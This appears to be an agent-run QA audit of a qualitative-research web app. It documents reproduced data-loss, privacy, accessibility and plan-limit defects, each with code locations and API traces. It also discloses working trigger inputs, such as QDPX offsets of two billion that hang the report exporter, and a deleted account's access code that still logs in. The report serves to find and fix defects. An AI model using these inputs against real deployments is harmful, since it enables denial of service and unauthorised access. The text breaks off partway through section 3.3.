# QualCanvas full user audit — 2026-08-23

Six agents drove the product end-to-end as real users against the local stack (Vite frontend,
backend `127.0.0.1:3007`, isolated Postgres container `qualcanvas-db`). A second, adversarial agent
then tried to refute every finding, working from fresh accounts and fresh state. Production was
never touched and no application source was modified.

**62 findings were raised; 59 were confirmed outright, 2 were refuted as stated and kept here only in the reduced form that survived (§3.4 item 7, §3.6 item 4), and 1 is unproven (§4).** The verifiers also tripped over 22 further
problems the original agents missed, which are folded in below. Where the two rounds disagreed on a
number or a cause, the verifier's measurement is the one recorded here.

Journeys: new-user core loop · plan limits and upgrade · legacy auth and account lifecycle ·
collaboration and intercoder reliability · import / export / sharing · cross-cutting quality
(responsive, keyboard, screen reader, error states, API semantics).

---

## 1. Verdict

The core loop is genuinely sound. A new researcher can sign up, add transcripts by paste and by
upload, build a nested codebook, code, run the free analyses and export — and nothing they do
_inside_ the app is lost. Persistence was checked byte-for-byte across reloads and re-logins, the
Statistics and Text Search numbers were hand-verified against `CanvasTextCoding` and are correct,
Krippendorff's alpha was recomputed by hand and matches the server exactly, and every permission
boundary tested (viewer writes, owner-only ops, cross-account access) held server-side.

The edges where research data leaves, re-enters or is destroyed are not safe. A QDPX
archive-and-restore silently re-points every coding in a Windows-authored transcript to different
words; deleting your account destroys audio you uploaded to _other people's_ canvases; the
"keep my access-code canvases" checkbox says one canvas and deletes three; a caption import silently
drops numeric answers; and a failed layout save reports "Saved". These failures are all silent — the
researcher finds out when the data is already wrong.

Ship it to a solo researcher who works inside the app and exports CSV. Do not ship it to anyone who
will archive, interchange or hand off a project, anyone under an ethics approval that requires
verifiable erasure, or anyone using a keyboard or a screen reader.

---

## 2. Ship-blockers

All CONFIRMED, all reproduced from scratch by the verifier on fresh state.

### SB-1 (critical) — QDPX round-trip slides every coding in a CRLF transcript

Silent corruption of the coded record. XML 1.0 mandates line-ending normalisation, and `escapeXml`
(`apps/backend/src/utils/qdpxParse.ts:346`) escapes only `& < > " '` — it never emits `&#13;`, so
raw CR bytes go into `project.qde` and come back collapsed.

- 260-char transcript, 12 CRLFs. Coding `The funding cut was the turning point` at 188–225, accepted
  201, server invariant passed, `codedText` stored exactly.
- `GET /canvas/:id/export/qdpx` → 200, 730 bytes. Import into a fresh canvas →
  `{"success":true,"message":"Imported 1 codes, 1 sources, 1 codings","skippedCodings":0}`. No warning.
- Imported transcript is 248 chars, `content.includes('\r') === false`. The coding still sits at
  188–225 and now quotes `g cut was the turning point for us.`. Drift is exactly one char per
  preceding CRLF and grows with transcript length.
- Unzipping the archive shows **12 raw 0x0D bytes and zero `&#13;` entities**, so _any_ conformant
  parser destroys them — every downstream QDA tool inherits the shifted offsets, not just QualCanvas.
- Nothing flags it: the importer recomputes `codedText` from the shifted text
  (`apps/backend/src/utils/qdpxImport.ts:225`), so the app's own
  `content.slice(start,end) === codedText` invariant still holds on the corrupted row.
- Precondition is ordinary: `parseTranscriptFile` passes `.txt` content through as `text.trim()`, so a
  Windows- or Word-authored transcript keeps its CRLFs all the way into Postgres.

### SB-2 (critical) — Deleting your account destroys audio you uploaded to other people's canvases, and to canvases you asked to keep

`apps/backend/src/routes/userAuthRoutes.ts:1033-1035`:
`deleteStoredUploads({ OR: [{ userId }, { canvasId: { in: canvasIdsBeingDeleted } }] })`.
The `{ userId }` disjunct is unbounded by `canvasIdsBeingDeleted` and matches every `FileUpload` the
user ever created, anywhere. The comment at `userAuthRoutes.ts:1010-1013` claims this exact failure
was already fixed.

- **A — a third party's project.** Owner created canvas `cmt5vaf6802qgwhskp0rma6u7` and invited a
  collaborator as editor. Collaborator uploaded `f5810d7e…wav`, owner uploaded `00115d78…wav`; `ls`
  showed both. The collaborator deleted **only their own** account
  (`{"legacyCanvasesRetained":0,"legacyCanvasesDeleted":0}`). Immediately after, `ls` showed only the
  owner's file and `FileUpload` for that canvasId returned exactly one row. The canvas is intact and
  still owned by the owner, who was not the deleting party, was not asked, and was told nothing. The
  `CanvasCollaborator` row cascaded away cleanly, so the owner has no trace of whose audio it was.
- **B — a canvas the user explicitly chose to keep.** Legacy code `CANVAS-ENMDXJVX`, linked email,
  legacy canvas `cmt5vcet502u7whsk8j3lmf9n`, one upload from the email session and one from the legacy
  session. `DELETE /auth/account {"deleteLegacyCanvases":false}` →
  `{"legacyCanvasesRetained":1,"legacyCanvasesDeleted":0}`. The canvas survives and re-opens with the
  access code — minus the email-session recording, gone from disk and from `FileUpload`.

The correct pattern already exists at `apps/backend/src/routes/canvasRoutes.ts:302`
(`deleteStoredUploads({ canvasId })`).

### SB-3 (high) — QDPX import strips leading/trailing whitespace from every source, sliding its codings

QualCanvas cannot read back its own valid export. `XMLParser` is constructed without
`trimValues: false` (`apps/backend/src/utils/qdpxParse.ts:258-268`) and fast-xml-parser trims text
nodes by default.

- Transcript `'   Leading spaces matter.\n\n\nBlank lines above.   '` (49 chars, DB-confirmed);
  codings at 0–17 and 40–49, both 201.
- Export → import → `{"success":true,"message":"Imported 1 codes, 1 sources, 2 codings","skippedCodings":0}`.
- Imported transcript is 43 chars. Postgres: 0–17 now reads `Leading spaces ma`, 40–49 reads `ve.`.
- The **writer is correct** — the exported `<PlainTextContent>` carries the whitespace byte-for-byte.
  The defect is entirely in QualCanvas's own reader.
- This round-trip also manufactures an out-of-range row (endOffset 49 against a 43-char source), which
  is the input to SB-5.

### SB-4 (high) — The legacy-canvas delete choice counts live canvases but acts on trashed ones too

Two queries disagree: the count driving the dialog filters `deletedAt: null`
(`userAuthRoutes.ts:615`); the set actually deleted or retained does not (`userAuthRoutes.ts:1017-1020`).

- **Over-deletion.** `CANVAS-73XMPNGX`, three legacy canvases each with a transcript, two soft-deleted
  to trash. `GET /auth/me` → `usage.legacyCanvasCount = 1`. The live dialog (captured in the browser)
  reads "Also delete 1 canvas created with your access code."
  `DELETE /auth/account {"deleteLegacyCanvases":true}` →
  `{"legacyCanvasesRetained":0,"legacyCanvasesDeleted":3}`; SQL on that `dashboardAccessId` returns 0
  rows. Two restorable canvases and their transcripts destroyed on a consent given for one.
- **Silent retention (mirror case).** `CANVAS-3XCPK633`, one legacy canvas, trashed.
  `legacyCanvasCount = 0`, so the checkbox at `apps/frontend/src/pages/AccountPage.tsx:1273` never
  renders. `DELETE /auth/account {"deleteLegacyCanvases":false}` → `{"legacyCanvasesRetained":1}`, and
  SQL still shows canvas `cmt5ve6ci02y5whskr0kzhwd3` with transcript
  `Participant H: identifiable personal story here.` attached to a `DashboardAccess` whose `userId` is
  now NULL. Identifiable participant data outlives a request to "permanently delete your account and
  all associated data", with the user never offered a say.

### SB-5 (high) — QDPX import accepts out-of-range, negative and 2-billion offsets; produces a 166,616.7% coverage figure and can hang the report exporter

`apps/backend/src/utils/qdpxImport.ts:230` only skips a coding when `slice()` yields `''`, and
`slice()` clamps — so nonsense offsets are stored verbatim. The app's own `POST /canvas/:id/codings`
route rejects exactly this ("Coding offsets are outside this transcript", 400); the importer does not.

- `<PlainTextSelection startPosition="2" endPosition="9999">` against a 6-char source → import 200,
  `skippedCodings: 0`, Postgres holds `startOffset=2, endOffset=9999`, `codedText 'ort.'`.
- `POST /canvas/:id/computed {nodeType:'stats'}` + `/run` on that canvas returns
  `{"label":"Short source","count":1,"percentage":100,"coverage":166616.7}`. Cause:
  `apps/backend/src/utils/textAnalysis.ts:426-432` sums `endOffset - startOffset` over `content.length`
  with no clamp. The same unclamped pattern at `apps/frontend/src/utils/richExportContent.ts:38-46`
  feeds the Word/HTML/Markdown coverage table.
- `endPosition="2000000000"` also imports 200 / `skippedCodings: 0`. `richExportContent` then runs
  `for (let i = c.startOffset; i < c.endOffset; i++) codedChars.add(i)`. Measured: endOffset 1,000,000
  → 173 ms; 5,000,000 → 1,952 ms. 2e9 builds a two-billion-entry Set — the tab OOMs or freezes before
  the report renders. A client-side denial of service triggered by an imported file.
- `startPosition="-50"` also imports and persists (`content.slice(-50, 5)` clamps, so the invariant
  passes). Reversed offsets (10 → 2) _are_ correctly skipped and disclosed, so the guard exists and
  simply does not cover the negative or overshoot cases.
- Reachable without a hostile file: SB-3's plain QualCanvas→QDPX→QualCanvas round-trip produces a
  40–49 coding on a 43-char source by itself.

### SB-6 (high) — Zoom / Otter / Teams caption import silently deletes any answer that is only a number

`apps/frontend/src/utils/subtitles.ts:29` — `if (/^\d+$/.test(line)) continue; // SRT cue index` — is
applied line by line with no block structure, so a caption whose entire text is digits is
indistinguishable from a cue index.

- Real parser (`apps/frontend/src/utils/transcriptFiles.ts`) run under `tsx` against a 4-cue SRT
  (`How many staff did you have?` / `14` / `And the budget?` / `250000`) returns
  `content: "How many staff did you have?\nAnd the budget?"`. Both numeric answers gone, no warning.
- Not limited to SRT: a WebVTT file (`How old were you?` / `42`) returns only the question.
  **WebVTT has no cue-index concept at all**, so in that path the skip has no justification whatsoever.
- Reachable from the UI: `FileUploadModal.tsx:66` calls `parseTranscriptFile` and
  `isSupportedTranscriptFile` accepts `.srt` / `.vtt`.
- Headcounts, budgets, years, ages and Likert responses are exactly the answers being deleted.

### SB-7 (high) — A failed layout save leaves the status chip reading "Saved"; the arrangement is silently lost

- Canvas at 1440×900. Block `**/api/**` with `route.abort('failed')`, drag a transcript node:
  transform `translate(50px, 50px)` → `translate(984.835px, 668.925px)`. The only aborted request is
  `PUT /api/canvas/<id>/layout`.
- Status bar sampled at t+1.5s / t+3.5s / t+7.5s: `["Saved","Layout save failed"]`,
  `["Saved","Layout save failed"]`, `["Saved"]`. The chip reads **"Saved" the whole time** — never
  "Saving…", never "Unsaved", never "Retry". After the ~4s toast expires there is no signal at all.
- Unblock and reload: node back at `translate(50px, 50px)`. Position preserved: **false**. Reproduced twice.
- `apps/frontend/src/stores/canvasStore.ts:540-564` sets `savingLayout` true/false and the catch only
  toasts — no error state recorded. `apps/frontend/src/components/canvas/CanvasWorkspace.tsx:3164`
  renders `{savingLayout ? 'Saving...' : 'Saved'}`, a binary with no failure branch.

### SB-8 (high) — Linking an email to your own legacy account wipes your browser-local research data, including the unsynced offline write queue

Reproduced end-to-end in the real app (the original report used a bundled store plus a shim; the
verifier drove the real UI).

- Signed in with `CANVAS-LEZLW3M9` through the real "Sign In with Code" form. Seeded the four keys the
  app really writes: `canvas-stickies-C1`, `canvas-weights-C1`, `canvas-journal-C1`,
  `qualcanvas-offline-queue` (holding a real `{method:'POST',url:'/api/v1/canvas/C1/codings',…}` entry).
- On `/account`: `identity = 'legacy:cmt5vgg3n034zwhskfz9d3hzt'`, keys = all four.
- Clicked "Link an email →", filled the real form, submitted. After:
  `identity = 'email:cmt5vj83a03c0whskybzjtnuj'`, **keys = `[]`**.
- Nothing changed server-side: same `DashboardAccess`, same canvases (link-account repoints them to the
  new userId), same person. `clearIfDifferentIdentity` (`authStore.ts:101-107`) keys on
  `legacy:${dashboardAccessId}` vs `email:${userId}`, so an _upgrade_ reads as a _different account_.
- What is destroyed has no server copy (the store's own docblock says so): sticky notes, code weights,
  theme groups, node colours, bookmarks, edge waypoints, cross-canvas refs — plus queued API mutations
  that never reached the server, which are simply lost.
- The same wipe fires on a plain email change: `handleSaveProfile` calls bare `logout()`
  (`AccountPage.tsx:211-213`). And the product actively nudges users into this ("Add an email to secure
  your account").

### SB-9 (high) — The GDPR account export omits reflexivity journal entries, and omits audit history entirely for linked legacy accounts

The Account page promises, verbatim on the live page: "Download a portable JSON archive of your
account, canvases, research content, and audit history."

- Journal: created a canvas with transcript `the mentoring made the difference`, then
  `POST /canvas/:id/journal` → 200 with `coderUserId` set. `GET /auth/export` → 200. The transcript
  string is present; `watch my assumption about mentoring` is **absent**. Each canvas object carries
  exactly 18 relation keys (transcripts … trainingDocuments) and **no `journalEntries` key**. The
  relation does exist — `journalEntries CanvasJournalEntry[]` hangs off `CodingCanvas` in
  `schema.prisma`, appended after the `@@index` block, which is why it was missed in the include list
  at `userAuthRoutes.ts:917-936`. The reflexivity journal has no other export route, and the panel
  itself calls it "an audit trail for your analytical choices".
- Audit: registered `CANVAS-HPPZQ0AM`, signed in twice with the code, linked an email.
  `GET /auth/export` → `auditLogs: []`, while
  `SELECT … FROM "AuditLog" WHERE "actorId"='cmt5vf8ej0318whski9afvmm2'` returns `auth.success | 2`.
  The rows are keyed to the `DashboardAccess` id; the export queries `actorId = userId`
  (`userAuthRoutes.ts:939`).
- `ResearchRepository` (user-owned, cascade) and `CanvasTemplate` (`createdBy`) also appear nowhere in
  the include list.

### SB-10 (high) — Running Text Search with no pattern returns one "match" per character and permanently poisons the canvas payload

- Create a Search node (`Analyze ▸ Text Search`) and click ▷ Run without configuring anything. The
  node's own empty state literally says "Configure a search pattern and click Run", but
  `ComputedNodeShell.tsx:124-128` renders the Run button with **no disabled condition at all**.
- On a two-transcript canvas (362 + 194 chars) the run returns 200 with `matches.length = 558`
  (= 362 + 194 + 2, one per character position plus one per transcript end), every match with
  `matchText:""` and a full context prefix.
- Scaling measured, not guessed: added one 20,760-char transcript and re-ran →
  **21,319 matches, 4,838,854-byte response, 368 ms**.
- **The result is persisted.** Postgres shows `length(result) = 4,838,615` on that
  `CanvasComputedNode` row, and because `GET /canvas/:canvasId` embeds `computedNodes`, that canvas now
  returns **4,871,149 bytes on every single load, forever**, from one accidental click. The only remedy
  from the UI is deleting the node.
- Cause: `computedRoutes.ts:175` passes `config.pattern || ''`; `textAnalysis.ts:260` builds
  `new RegExp('', 'gi')`; the zero-length guard at `:282` just bumps `lastIndex` so the loop walks the
  whole string. Control: pattern `money` → 121 matches / 29 KB; a whitespace pattern → 0 matches / 284 bytes.

### SB-11 (high) — Cloning a shared canvas launders AI-generated codings into human ones and falsifies the IRB AI-disclosure paragraph

`apps/backend/src/routes/shareRoutes.ts:200-217` copies `startOffset`, `endOffset`, `codedText`, `note`
and `annotation` — and omits `source` (and `coderUserId`), so every coding lands as the default
`'human'`.

- Source canvas, 7 codings, one with `source='ai'`: `GET /canvas/:id/ai/disclosure` →
  `{"total":7,"aiOriginated":1,"humanOriginated":6,"aiPercent":14.3}`, paragraph reads "1 (14.3%)
  originated from an accepted AI suggestion and 6 were created manually".
- Shared, cloned into a second account: `{"total":7,"aiOriginated":0,"humanOriginated":7,"aiPercent":0}`,
  paragraph reads "0 (0%) … and 7 were created manually". Postgres on the clone: `source='human'` for
  all 7.
- The endpoint's own comment (`aiRoutes.ts:465-472`) says these figures are "computed from stored
  provenance … so the disclosure is reproducible, not self-reported". After a clone it is neither.
- The same loss happens on a QDPX round-trip.

### SB-12 (high) — Signup collapses under modest concurrency: 20 simultaneous requests, 20 HTTP 500s

- 12 parallel `POST /auth/signup` → one 500. **20 parallel → 20/20 500s, each after ~21.8 s.** All 20
  transactions rolled back cleanly (zero `User` rows persisted), consistent with the interactive
  transaction budget being blown by bcrypt saturation.
- bcrypt at 12 rounds runs **twice** per signup — the password, plus the `DashboardAccess` access code
  _inside_ the interactive transaction at `userAuthRoutes.ts:88`. Moving the access-code hash outside
  the transaction removes most of the exposure.
- Separately, one signup in the first round produced a 500 with the account **fully committed**
  (`j4aug23-d`, `createdAt 12:37:38.967`, `DashboardAccess` + `EmailPreference` present, and uniquely
  among its siblings **no `auth.signup` AuditLog row**). The verifier could not reproduce that state —
  see §4. The user impact originally claimed for it is refuted: `bcrypt.compare` against the submitted
  password returns true, `emailVerified: false` does not block login and `sessionsInvalidAt` is null,
  so the user can simply log in.

### SB-13 (high) — `/account` has four unlabelled inputs, two unnamed selects and an unnamed button, and the app shell has no landmarks

- axe-core 4.x (wcag2a/2aa/21a/21aa) on `/account` at 1440×1200: `[critical] label (2)`,
  `[critical] select-name (2)`, `[critical] button-name (1)`.
- An independent accessible-name walk found **7** unnamed controls: the Profile **Name** input, the
  **Email** input, the AI **Provider** select, the **API Key** password input, its show/hide toggle
  button, the **Model** input, and a report-frequency select. The visible captions are `<label>`
  elements with no `htmlFor` and no wrapping — decorative text to a screen reader.
  `AccountPage.tsx` has 12 `<label>` and only 6 `htmlFor`; the password section at `:979-1023` does it
  correctly, so the pattern is known in the same file.
- A screen-reader user cannot reliably edit their own profile or configure AI.
- Landmarks: `main, nav, header, footer, aside` = `[]` on `/account`, and no element carries role
  `main`/`navigation`/`banner`/`contentinfo`/`complementary`. This is **app-wide, not account-specific** —
  axe reports `[moderate] region (3)` on `/canvas` and `/canvas/:id` too, flagging
  `<h1 class="sr-only">Canvas workspace</h1>`, the verification banner and `<div id="canvas-main">`.
  Fix at the shell, not the page.

### SB-14 (high) — 28 of 31 `aria-modal` dialogs have no focus trap

The fix already exists in the codebase and its docblock warns about exactly this:
`apps/frontend/src/hooks/useFocusTrap.ts:6-19` moves focus in, cycles Tab inside, and restores focus on
close, and states explicitly that `aria-modal` alone does not constrain Tab order.

- `grep -rl 'aria-modal' --include=*.tsx` excluding tests = **31** files; `grep -rl 'useFocusTrap'` =
  **3** (AiAutoCodeModal, AudioUploadModal, QdpxImportModal). `comm` of the two = **28** without it.
- ShareCanvasModal on open:
  `{hasDialog:true, ariaModal:"true", activeInside:false, activeName:"Share canvas"}` — focus never
  enters. 18 of 22 Tabs land outside the dialog, walking "More canvas actions", "Analyze menu" and the
  React Flow nodes behind it. Escape closes it and leaves focus on an unnamed button, not the opener.
- KeyboardShortcutsModal (`?`): focus starts on a transcript node, 20/22 Tabs outside, Escape drops
  focus to BODY.
- TranscriptUploadModal: focus starts inside via autoFocus but escapes after 3 stops.
- Affected components include ShareCanvasModal, RichExportModal, IntercoderReliabilityModal,
  ExcerptBrowserModal, SurveyImportModal, FileUploadModal, CommandPalette, MethodologyWizard, PlanWelcome.

---

## 3. Everything else confirmed

Grouped by journey, ranked within group.

### 3.1 First run and the core loop

1. **(medium) Parent theme codes export as "0 codings, 0% coverage" while the app's own sidebar rolls
   them up correctly.** With 5 leaf codes nested under 2 themes and 7 codings applied, the left sidebar
   reads "THEME: Personal cost / 5" and "THEME: System failures / 2" (`buildCodeTree` in
   `panels/codeTree.ts` does an explicit post-order roll-up and documents why). At the same moment the
   Codebook table reads `THEME: Personal cost | - | 0 | 0% | -`, the downloaded CSV contains
   `"THEME: Personal cost",#DB2777,"",0,0%,""`, and the Statistics node's API result returns
   `count=0 percentage=0 coverage=0`, plotting the themes as zero-height bars.
   `CodebookExportModal.tsx:40` filters `codings.filter(c => c.questionId === q.id)` with no descendant
   walk; `computeStats` at `textAnalysis.ts:404-407` does the same. **The CSV is the artefact handed to
   a supervisor, and it contradicts the app's own sidebar.**
2. **(medium) "Coverage %" means two different things and differs by ~40× for the same code.**
   `Financial strain` reads Coverage `0.3%` in Tools ▸ Codebook and in the exported CSV
   (`"Financial strain",#DB2777,"THEME: Personal cost",2,0.3%`) but `coverage 12.6` in the Statistics
   result for the same code at the same moment. `CodebookExportModal.tsx:34` divides by the chars of
   **all** transcripts in the canvas (70 / 21,316); `computeStats` (`textAnalysis.ts:406-411`) divides
   by only the transcripts that code appears in (70 / 556). Neither surface names its denominator, and
   the Statistics one inflates as uncoded documents are added. This affects leaf codes, so fixing the
   theme roll-up above would not fix it.
3. **(medium) CSV — the only export the free plan allows — is missing from the Export menu, and the
   menu's other entries are all dead ends.** Enumerated items for a free user:
   `["Export PNG","Export Report (Word, web, text)","Export Excel (.xlsx)","AI Disclosure statement","QDPX export — upgrade","Import QDPX (NVivo / ATLAS.ti)"]`.
   Clicking each of the three real exports gives "This export format is available on Student, Pro, and
   Team plans" (`CanvasToolbar.tsx:163-170`, `hasRichExports = effectivePlan !== 'free'`), and only QDPX
   is labelled as an upgrade. `plans.ts:37` gives free `allowedExportFormats: ['csv']`. The working CSV
   lives at Tools ▸ Codebook ▸ Download CSV, and the onboarding checklist row that says "Export your
   codings to CSV" has `action: null` (`OnboardingChecklist.tsx:69-73`) so it is not even clickable.
   **The free user's Export menu contains zero working exports.**
4. **(medium) Sentiment presents an unqualified −1..+1 score with no method statement; plainly negative
   excerpts score 0.0 "neutral".** Node text: `Avg score: -0.14 (−1 to +1) | 7 segments`.
   "Some days I feel completely isolated. My friends stopped calling after the first year." → score 0,
   **magnitude 0** (zero words hit the lexicon at all). Same for the "system is fragmented" excerpt.
   `scoreSentiment` (`textAnalysis.ts`) is a plain AFINN lookup with a one-word negation flip divided by
   total word count, so the score also dilutes with excerpt length — a second unstated property.
   `grep -E 'lexicon|AFINN|indicative|caveat|method'` in `SentimentNode.tsx` returns nothing.
5. **(low) `POST /canvas/:id/questions` silently discards `parentQuestionId`.** Sending
   `{text, color, parentQuestionId}` returns 201 with `parentQuestionId: null` — `createCanvasQuestionSchema`
   (`validation.ts:126-132`) declares only `text` and `color` and zod strips the rest, while
   `updateCanvasQuestionSchema` at `:134-141` does accept it. Anything scripting the API to build a code
   hierarchy in one pass gets a flat codebook with no indication anything went wrong. (This cost the
   verifier a full repro cycle.)
6. **(low) Statistics bar chart is unlabelled.** With 7 codes, all text inside the node at default size:
   `["Statistics","Bar","Pie","7","total","Service fragmen","0","0.5","1","1.5","2","THEME: Personal"]` —
   seven bars, two axis labels, both hard-cut at 15 chars (`StatsNode.tsx:112` `item.label.slice(0, 15)`
   with a bare `<XAxis tick={{fontSize:9}} />`). One of the two labelled bars is a zero-height theme bar,
   i.e. a label attached to nothing.
7. **(low) Reload restores node positions but discards zoom and pan.** Viewport transform
   `translate(263.582px, 40.4765px) scale(0.33047)` → zoom in 4× → reload → byte-identical to the
   pre-zoom fit-view transform. The viewport lives in a `useRef` map in `CanvasWorkspace.tsx`; the layout
   endpoint stores per-node geometry only.
8. **(low) The onboarding checklist renders a `<button>` inside a `<button>`.** Console on canvas load:
   `Warning: validateDOMNesting(...): <button> cannot appear as a descendant of <button> … at OnboardingChecklist`.
   `document.querySelectorAll('button button').length === 1`; the nested element is the
   `aria-label="Dismiss checklist"` control inside the header button (`OnboardingChecklist.tsx:110-133`).
   Note: the component only renders for a brand-new account (gated on
   `onboardingV2Enabled && onboardingV2Complete`, `CanvasPage.tsx:344`).

### 3.2 Plans, limits and upgrade

1. **(high, business) The plan-limit "Upgrade" modal renders behind every canvas modal and its
   "View Plans" button is physically unclickable.** `UpgradePrompt` (`App.tsx:57`) is
   `fixed inset-0 z-50`, but ~20 canvas panels use `z-[9999]` (IntercoderPanel, AiAutoCodeModal,
   CrossCaseAnalysisModal, CommandPalette, …) and ShareCanvasModal mounts later in DOM order. Measured
   twice — intercoder refusal on Pro, and the collaborator-cap refusal from the Share modal: the
   `alertdialog` is present in the DOM, `document.elementFromPoint` at the centre of the upgrade card
   returns the panel underneath, and clicking "View Plans" times out as intercepted. The user sees only
   a toast; **every upgrade CTA fired during real work is dead**, and the invisible dialog still steals
   focus and installs a Tab trap.
2. **(medium) Every plan-gate refusal names "Pro and Team" and omits Student, upselling `.edu` users to
   $15 for features that cost $5.** Live as a `.edu` free user: `403 "matrix analysis is available on
Pro and Team plans"`, `403 "AI features are available on Pro and Team plans"`. Nine such messages
   (`planLimits.ts:204, 221, 246, 292, 304, 339, 475, 490, 506`) gate features Student has in full
   (`plans.ts:63-100`: `autoCodeEnabled`, all 13 `allowedAnalysisTypes`, ethics, cases, AI, file upload,
   repository, full export list). `planLimits.ts:406` already says "available on the Student, Pro, and
   Team plans" for transcription — proof the rest is stale copy. The modal reinforces it: "Upgrade to
   Pro from $12/mo on annual billing ($15 month-to-month) … 40% off with .edu email" and never mentions
   Student's $5.
3. **(medium) Login silently downgrades a paid plan.** `userAuthRoutes.ts:190-193` (and `:338-341`)
   recompute plan on every login as
   `(subscription active|trialing) || legacyPricing ? user.plan : 'free'` and **persist** it. Any account
   whose Subscription row is missing or lapsed is written back to free on next sign-in with no notice and
   no audit trail the verifier could find. This is the mechanism behind the known production comping
   trap, but it fires for any paid user whose subscription record drifts.
4. **(medium) After the first plan-limit prompt, every plan-blocked action for 5 minutes fails with a
   bare "Failed to add node" — and it survives a reload.** Analyze ▸ Comparison → correct "Plan Limit
   Reached" dialog; dismiss; Analyze ▸ Co-occurrence → `{planPrompt:false, toastFail:true}`, page text
   contains only "Failed to add node"; full reload → same again. Network shows the server returned
   `403 {"error":"cooccurrence analysis is available on Pro and Team plans","code":"PLAN_LIMIT_EXCEEDED"}`
   each time. `UpgradePrompt.tsx:21-24` bare-`return`s inside a 5-minute
   `sessionStorage['upgrade-prompt-last-shown']` window and `AddComputedNodeMenu.tsx:88`
   `catch { toast.error('Failed to add node'); }` discards the body, so there is no fallback.
5. **(medium) The Analyze menu offers all its tools to Free users with no lock or Pro badge; 6 of 10 are
   dead ends.** Live capture of the open menu returns exactly **10** buttons, each
   `{disabled:false, aria:null, lock:false}`: Text Search, Word Cloud, Sentiment, Statistics,
   Co-occurrence, Coding Query, Clustering, Framework Matrix, Comparison, Theme Map. API probe:
   search/wordcloud/sentiment/stats → 201; cooccurrence/codingquery/cluster/matrix/comparison/treemap → 403. `grep -icE 'plan|lock|upgrade|allowedAnalysis'` on `AddComputedNodeMenu.tsx` returns **0**.
   Identical on desktop and mobile. (Corrects the first round's "13 items / 9 failures".)
6. **(medium) Intercoder agreement is Team-only but the Tools menu offers it on every plan, and the
   refusal has no reachable upgrade path.** As owner on Pro: full roster, full configuration, then a red
   toast "Intercoder agreement is available on Team plans"; the menu item carries no Team-only marker or
   disabled state and the panel is left in its empty state. The upgrade modal that fires is occluded
   (item 1) **and** pitches Pro — which does not unlock intercoder (`plans.ts`: `intercoderEnabled` true
   only for `team`). `grep intercoderEnabled apps/frontend/src` returns nothing.
7. **(low) `/pricing` advertises "Unlimited" AI text analysis on every paid tier; the server caps it at
   1,000/day.** Proven by exhaustion, not by reading: 1,000 `AiUsage` rows inserted for a Pro account,
   then `POST /canvas/:id/ai/suggest-codes` →
   `403 {"error":"Daily AI request limit reached (1000/day)","code":"PLAN_LIMIT_EXCEEDED","current":1000,"max":1000}`
   (rows then deleted). `PricingPage.tsx:427` vs `plans.ts` `aiRequestsPerDay: 1000` for student/pro/team.
   Unreachable for a human, but it is a false claim on a public pricing page. Every other row of that
   comparison table matches `plans.ts`; the only other gaps are omissions (Pro's `maxCollaborators: 3`,
   docx/xlsx formats are not advertised at all).
8. **(low) Restore-from-trash swallows the plan-limit reason.** Server:
   `403 {"error":"Free plan allows 2 canvases","code":"PLAN_LIMIT_EXCEEDED","current":2,"max":2}`.
   `CanvasListPanel.tsx:265-271` has a bare `catch` with a hardcoded "Failed to restore canvas", unlike
   `handleCreate` (`:247`) and `handleClone` (`:302`) which surface `err?.response?.data?.error`. In a
   clean session the global modal covers for it; in the realistic sequence (hit the create cap → get the
   modal → go to Trash → Restore) it is inside the 5-minute suppression window and the user sees only
   the generic string. Verified both paths in the browser.
9. **(low) The canvas dashboard shows no quota at all.** Live body text at exactly 2/2 canvases:
   "Coding Canvases / … / New Canvas / Have a share code? …" — no count, no cap, and the New Canvas
   button fully enabled. The create form's text tested against `/limit|cap|2 of 2|upgrade/i` → false.
   `maxCanvases` appears nowhere in `CanvasListPanel.tsx`; the Account page is the only quota surface in
   the product. The first signal is a failed submit.
10. **(low) A trashed canvas keeps its name reserved and the 409 blames a canvas the user cannot see.**
    Create "Study One", delete it (200, to trash), re-create with the same name →
    `409 {"error":"A canvas with this name already exists"}`. Trash is a collapsed section
    (`CanvasListPanel.tsx:185`, `showTrash` defaults false). Trash-then-recreate is exactly the
    workaround a Free user at 2/2 is pushed toward.
11. **(low) Signup silently grants a 14-day Pro trial that is never advertised, and the Account page
    shows nonsense ratios after it lapses.** Signup returns `{"plan":"free","emailVerified":false}` with
    no mention of a trial; after verification `effectivePlan=pro` and a 3rd canvas, an 11th code and a
    matrix node all succeed. `grep trial` in `PricingPage.tsx`, `LandingPage.tsx`, `LoginPage.tsx` → zero
    hits. After lapse the dashboard _does_ explain it ("Your Pro trial ended. Your data is safe, but new
    canvases, codes, and analyses are now limited to the Free tier."), but the Account usage panel renders
    "3/2 Canvases" and "1/0 Share codes" with full-width red bars and no text —
    `AccountPage.tsx:766-780` clamps the bar width and never handles `value > max` as a state.
12. **(low) The share gate reports an allowance instead of a remedy:**
    `403 "Free plan allows 0 share codes"`. Student ($5) allows 2.
13. **(low) Cloning a shared canvas installs Pro-only analysis nodes on a Free canvas.** Free user clones
    a Pro canvas → 201, clone contains `matrix`, `cooccurrence`, `timeline` nodes; running one →
    `403 "matrix analysis is available on Pro and Team plans"`, while creating one directly is refused
    with the identical 403. `shareRoutes.ts:232` copies every source `computedNode` verbatim with no
    `allowedAnalysisTypes` check, unlike the transcript/code/word guards immediately above at `:102-128`.
    The nodes can at least be deleted (200), so nothing is permanent.

### 3.3 Auth and account lifecycle

1. **(medium) Account deletion leaves the user's real name and a still-working access code in the
   database.** An ordinary email signup with no legacy history and no canvases: after
   `DELETE /auth/account` returned `{"legacyCanvasesRetained":0,"legacyCanvasesDeleted":0}`,
   `DashboardAccess` still holds `name 'VJ2 coll'`, `role researcher`, `userId NULL`,
   `expiresAt 2099-12-31`, `accessCodeHash` present. Signup mints this row unconditionally
   (`userAuthRoutes.ts:86-100`, `USR-${nanoid(12)}`) and the relation is `onDelete: SetNull`
   (`schema.prisma:139`), so `prisma.user.delete` orphans it. One session left five such rows. The
   credential is not merely present — `POST /auth` with `CANVAS-73XMPNGX` **still returns 200 and mints
   a working session** after that account was deleted with `deleteLegacyCanvases:true`.
2. **(medium) After deleting an account with canvases kept, the UI throws away the server's report of
   what survived.** Intercepted on the wire:
   `{"success":true,"message":"Account deleted","legacyCanvasesRetained":2,"legacyCanvasesDeleted":0}`.
   What the user got: a bare "Account deleted" toast and a redirect to `/login`. Grepping the resulting
   page for `/access code|retained|kept|CANVAS-/i` → no match, and the store has just cleared
   `dashboardCode`, so the only route back to two real canvases is unrecoverable. The backend returns
   that number specifically so the caller can tell the user (`userAuthRoutes.ts:1046-1053`).
3. **(medium) Access-code-only users have no self-serve erasure.** With a legacy session cookie:
